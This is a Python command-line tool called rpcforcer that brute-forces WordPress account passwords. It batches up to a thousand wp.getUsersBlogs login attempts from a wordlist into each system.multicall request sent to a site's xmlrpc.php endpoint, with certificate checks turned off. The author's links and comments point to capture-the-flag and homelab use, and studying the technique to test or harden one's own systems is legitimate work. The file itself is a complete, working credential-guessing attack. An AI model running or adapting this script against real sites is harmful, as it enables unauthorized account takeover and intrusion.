#!/usr/bin/python3

'''
https://fexsec.net
https://github.com/fexsecc
https://app.hackthebox.com/users/1842563
'''

import argparse
import requests
import threading
from colorama import Fore, Style
import urllib3

urllib3.disable_warnings() # disable self signed tls certificate warning, for ctfs and homelabs
class Forcer:
    def __init__(self, url: str, wordlist:str, port: int=0, user='admin'):
        self.url = url
        self.wordlist = wordlist
        if port:
            self.url += ":" + str(port)
        self.user = user
    
    def craft_req_body(self):
        start = '''
            <?xml version="1.0"?>
    <methodCall>
    <methodName>system.multicall</methodName>
    <params>
      <param><value><array><data>
      '''
        end = '''
    </data></array></value>
    </param>
    </params>
    </methodCall>
    '''
        body = start
        cnt = 1
        with open(self.wordlist) as list:
            for line in list:
                body += f'''
                    <value><struct>
                  <member>
                	<name>methodName</name>
                	<value><string>wp.getUsersBlogs</string></value>
                  </member>
                  <member>
                	<name>params</name><value><array><data>
                	<value><array><data>
                	<value><string>{self.user}</string></value>
                	<value><string>{line.strip()}</string></value>
                	</data></array></value>
                	</data></array></value>
                  </member>
                  </struct></value>
                '''
                cnt += 1
                # send requests by the thousand, modify this depending on servers power
                if cnt % 1000 == 0:
                    body += end
                    print(Fore.BLUE)
                    print(f"sending body: {body}")
                    print(Style.RESET_ALL)
                    self.send_request(body)
                    body = start
        list.close()
    
           
    
    def send_request(self, body):
        req_url = self.url + "/xmlrpc.php"
        headers = {'Content-Type': 'application/xml'}
        x = requests.post(req_url, data=body, headers = headers, verify=False)
        print(Fore.RED)
        print(x.text)
        print(Style.RESET_ALL)
           
    def test_valid(self):
        req_url = self.url + "/xmlrpc.php"
        test = requests.post(req_url, {"a":"b"}, verify=False)
        if test.status_code != 200:
            print(Fore.YELLOW)
            print(f"[!] Expected code 200, but got {test.status_code} instead! quitting...")
            print(Style.RESET_ALL)
            return 1


def args_to_class():
    example_usage = '''example usage:
        ./rpcforcer.py -u john https://example.com /opt/wordlists/rockyou.txt -p 8443
        python3 rpcforcer.py http://example.com /opt/wordlists/rockyou.txt'''

    parser = argparse.ArgumentParser(prog='rpcforcer',
                                    description='brute force wordpress logins with xmlrpc',
                                    epilog=example_usage,
                                    formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-u', '--user', metavar='user', type=str, help='user to bruteforce (defaults to admin)')
    parser.add_argument('base_url', type=str, help='base url in https://example.com format')
    parser.add_argument('wordlist', type=str, help='wordlist file path')
    parser.add_argument('-p', '--port', type=int, help='port number (if not default 80/443)')
    args = parser.parse_args()
    
    if args.user:
        return Forcer(args.base_url, args.wordlist, args.port, args.user)
    else:
        return Forcer(args.base_url, args.wordlist, args.port)

def banner():
    print(Fore.BLUE)
    print('''
     ____             _____                       
    |  _ \ _ __   ___|  ___|__  _ __ ___ ___ _ __ 
    | |_) | '_ \ / __| |_ / _ \| '__/ __/ _ \ '__|
    |  _ <| |_) | (__|  _| (_) | | | (_|  __/ |   
    |_| \_\ .__/ \___|_|  \___/|_|  \___\___|_|   
          |_|                                     
    https://fexsec.net
    ''')
    print(Style.RESET_ALL)

def main():
    banner()
    forcer = args_to_class()
    if forcer.test_valid():
        return 1
    forcer.craft_req_body()
    
if __name__ == "__main__":
    main()
